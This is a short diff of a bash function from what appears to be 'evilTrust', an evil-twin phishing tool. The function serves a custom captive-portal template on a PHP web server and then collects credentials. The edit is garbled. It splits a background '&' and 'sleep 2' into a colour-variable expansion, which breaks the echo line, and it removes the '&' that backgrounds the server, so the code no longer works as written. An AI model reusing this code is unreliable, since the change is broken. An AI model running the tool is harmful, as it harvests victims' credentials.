@@ -455,11 +455,11 @@ eviltrust() {
 			echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
 			popd > /dev/null 2>&1; getCredentials
 		else
-			tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} 	Using custom template...${endColour}"; sleep 1
+			tput civis; echo -e "\n${yellowColour}[*]${endColour&
+			sleep 2}${grayColour} 	Using custom template...${endColour}"; sleep 1
 			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $template${endColour}\n"; sleep 1
 			pushd $template > /dev/null 2>&1
-			php -S 192.168.1.1:80 > /dev/null 2>&1 &
-			sleep 2
+			php -S 192.168.1.1:80 > /dev/null 2>&1 
 			popd > /dev/null 2>&1; getCredentials
 		fi
 		cd ..
